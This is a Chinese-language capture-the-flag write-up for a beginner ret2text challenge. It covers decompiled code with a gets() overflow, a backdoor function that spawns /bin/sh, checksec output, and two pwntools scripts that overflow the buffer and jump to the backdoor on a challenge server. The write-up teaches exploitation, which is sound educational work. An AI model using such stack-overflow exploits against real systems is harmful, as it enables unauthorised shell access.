# 【中等】N 个人各自有着自己的秘密

> hint：什么你不知道什么是 Pwn？由于其发音与 “砰” 类似，而其又指代成功攻入受害者电脑，因此被广泛流传了下来。本题是 pwn 最最最简单的基础入门系列 **ret2text** ，我相信大家都知道吧？但是有一个栈平衡的坑，或许你可以在[这里](https://blog.csdn.net/Myon5/article/details/131594204)找到灵感。最后：**求求你了写写 pwn 吧，只要是我能做的，我什么都愿意做！**

很简单的 ret2text ，没有人多少人写出来是我没有想到的。实际上，参考一下 hint 的链接就可以出来了。

# 题目分析
先用 IDA 反编译一下，可以看到程序的源代码：

``` c++

int backdoor()
{
  puts("Backdoor triggered! Welcome to the secret area! miao~");
  return system("/bin/sh");
}

int secret_board()
{
  char v1[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Hello, please enter your secret message:");
  gets(v1);
  return puts("Thanks for sharing your secret! (^_^)");
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  secret_board();
  return 0;
}

```

很明显，我们看到了有一段代码，可以调用 secret_board 函数，但是 secret_board 函数中调用了 gets 函数，而gets 函数可以触发栈溢出，漏洞就在这里了。

我们可以将原函数的返回用栈溢出修改为 backdoor ，即可获得shell（注意栈溢出）。

在 IDA 我们可以看到：
``` c
.text:0000000000401156 ; int backdoor()
.text:0000000000401156                 public backdoor
.text:0000000000401156 backdoor        proc near
.text:0000000000401156 ; __unwind {
.text:0000000000401156                 push    rbp
.text:0000000000401157                 mov     rbp, rsp
.text:000000000040115A                 lea     rax, s          ; "Backdoor triggered! Welcome to the secr"...
.text:0000000000401161                 mov     rdi, rax        ; s
.text:0000000000401164                 call    _puts
.text:0000000000401169                 lea     rax, command    ; "/bin/sh"
.text:0000000000401170                 mov     rdi, rax        ; command
.text:0000000000401173                 call    _system
.text:0000000000401178                 nop
.text:0000000000401179                 pop     rbp
.text:000000000040117A                 retn
.text:000000000040117A ; } // starts at 401156
.text:000000000040117A backdoor        endp
```

再看看保护：
``` Bash
┌──(kali㉿LAPTOP-9O25NAN3)-[~/Desktop/nex_practice]
└─$ checksec ./secret_board
[*] '/home/kali/Desktop/nex_practice/secret_board'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

# exp

在提示中说了注意栈溢出，这里给出两种解决方法（记得修改端口）：
1. 跳过 `push rbp; mov rbp, rsp;` 保证堆栈平衡
``` python
from pwn import *
p = remote('202.199.6.66', 36479)
# p = process('./secret_board')
payload = b'a' * (64+8) + p64(0x40115A)
p.sendline(payload)
p.interactive()
``` 
2. 利用 retn 保持堆栈平衡
``` python
from pwn import *
p = remote('202.199.6.66', 36479)
# p = process('./secret_board')
payload = b'a' * (64+8) + p64(0x40117A) + p64(0x401156)
p.sendline(payload)
p.interactive()
```

怎么样，代码很简单吧。<(￣︶￣)>

我看有的人 get shell ，但是没有获得 flag ，有点可惜，在题目中说明了，flag 在环境变量中，get shell 后，输入 `env` 可以看到。